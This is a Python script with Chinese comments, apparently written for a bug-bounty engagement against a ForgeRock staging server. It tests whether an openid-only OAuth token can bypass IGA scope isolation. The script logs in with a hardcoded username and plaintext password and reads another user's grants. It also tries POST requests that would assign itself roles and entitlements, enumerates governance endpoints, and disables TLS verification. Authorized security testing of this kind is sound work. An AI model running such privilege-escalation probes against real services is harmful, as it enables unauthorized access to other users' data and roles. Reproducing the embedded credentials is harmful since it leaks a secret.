# -*- coding: utf-8 -*-
"""AIC 第三十二轮:单点打透——IGA scope 隔离承诺验证(openid vs fr:iga:* 干净对照)
承诺(IGA API 设计):访问 /iga/governance/* 需要 fr:iga:* scope 的 token;
   openid-only token 应被拒(400/403)。
反例:openid token 也能访问/操作 IGA -> scope 隔离失效 = 越权。
上一轮意外发现:openid token 查自己 grants 200(空)——之前从未做低权限对照。
本轮决定性实验:
  A. openid vs fr:iga:* 对照:grants 自己/他人(仅 Bearer,无 Cookie,排除会话兜底)
  B. POST grants 创建:用错误泄露的合法类型(entitlements/applications/roles/accountGrant/entitlementGrant)
     构造正确格式 -> openid token 能否给自己加角色(越权提权实锤)
  C. IGA 端点面重新打开:approvals/assignments/entitlements/applications/roles/tasks 等
  D. POST requests 创建访问请求
预期结果表:
  成立(漏洞) -> openid token 对任一写/管理面返回 200 或有数据;POST grants 成功
  不成立 -> openid token 全部 400/403,与 fr:iga:* 行为有差异(scope 隔离真实存在)
"""
import requests, urllib3, json, time
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/realms/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
OTHER_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d8'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# 登录
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok})
print('LOGIN OK')

def get_token(scope):
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
        '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote(scope, safe=''))
    r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
    loc = r.headers.get('Location', '')
    code = loc.split('code=')[1].split('&')[0] if 'code=' in loc else None
    if not code:
        print('authorize failed[%s]: %d %s' % (scope, r.status_code, loc[:120]))
        return None
    r2 = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code,
                                'redirect_uri': RU, 'client_id': 'endUserUIClient'},
                headers=FORM, timeout=12, verify=False)
    return r2.json().get('access_token')

tok_openid = get_token('openid')
tok_iga = get_token('openid fr:iga:*')
print('openid token:', (tok_openid or 'NONE')[:40])
print('iga token   :', (tok_iga or 'NONE')[:40])

def iga_req(method, path, token, body=None):
    """仅 Bearer 认证,不带 Cookie——干净对照 scope 的作用"""
    h = {'Authorization': 'Bearer ' + token,
         'Accept-API-Version': 'resource=2.1, protocol=1.0',
         'Content-Type': 'application/json'}
    kw = {'headers': h, 'timeout': 12, 'verify': False}
    if body is not None:
        kw['json'] = body
    try:
        r = S.request(method, BASE + path, **kw)
        print('%-5s %-72s -> %d %s' % (method, path[:72], r.status_code, r.text[:130].replace('\n', ' ')))
        return r
    except Exception as e:
        print('%-5s %-72s -> ERR %s' % (method, path[:72], str(e)[:60]))
        return None

def pair(method, path, body=None):
    print('-- openid --')
    iga_req(method, path, tok_openid, body)
    time.sleep(0.3)
    print('-- fr:iga:* --')
    iga_req(method, path, tok_iga, body)
    time.sleep(0.3)

print('\n=== A. grants 自己/他人对照 ===')
pair('GET', '/iga/governance/user/%s/grants?pageSize=10&grantType=role' % MY_ID)
pair('GET', '/iga/governance/user/%s/grants?pageSize=10&grantType=role' % OTHER_ID)

print('\n=== B. POST grants 创建(合法类型格式迭代) ===')
GP = '/iga/governance/user/%s/grants' % MY_ID
bodies = [
    {'itemType': 'roles'},
    {'itemType': 'roles', 'item': {'name': 'test-role'}},
    {'itemType': 'role', 'item': {'name': 'test-role'}},
    {'type': 'roles', 'roles': [{'name': 'test-role'}]},
    {'roleName': 'test-role', 'type': 'role'},
    {'itemType': 'entitlements', 'item': {'name': 'test-ent'}},
    {'itemType': 'accountGrant', 'item': {'application': {'name': 'test-app'}}},
]
for b in bodies:
    print('body:', json.dumps(b, ensure_ascii=False)[:90])
    pair('POST', GP, b)

print('\n=== C. IGA 端点面重开 ===')
EPS = [
    '/iga/governance/approvals',
    '/iga/governance/approvals?pageSize=10',
    '/iga/governance/assignments?pageSize=10',
    '/iga/governance/entitlements?pageSize=10',
    '/iga/governance/applications?pageSize=10',
    '/iga/governance/roles?pageSize=10',
    '/iga/governance/tasks?pageSize=10',
    '/iga/governance/certifications?pageSize=10',
    '/iga/governance/user/%s/access' % MY_ID,
    '/iga/governance/user/%s/assignments' % MY_ID,
    '/iga/governance/user/%s/entitlements' % MY_ID,
    '/iga/governance/access?pageSize=10',
    '/iga/governance/settings',
    '/iga/governance/analytics/approvals',
]
for ep in EPS:
    pair('GET', ep)

print('\n=== D. POST requests 创建访问请求 ===')
RP = '/iga/governance/user/%s/requests' % MY_ID
for b in [None, {}, {'roles': [{'name': 'test-role'}]}, {'itemType': 'roles', 'item': {'name': 'test-role'}}]:
    print('body:', json.dumps(b, ensure_ascii=False) if b is not None else '(none)')
    pair('POST', RP + '?_pageSize=0&_status=in-progress', b)
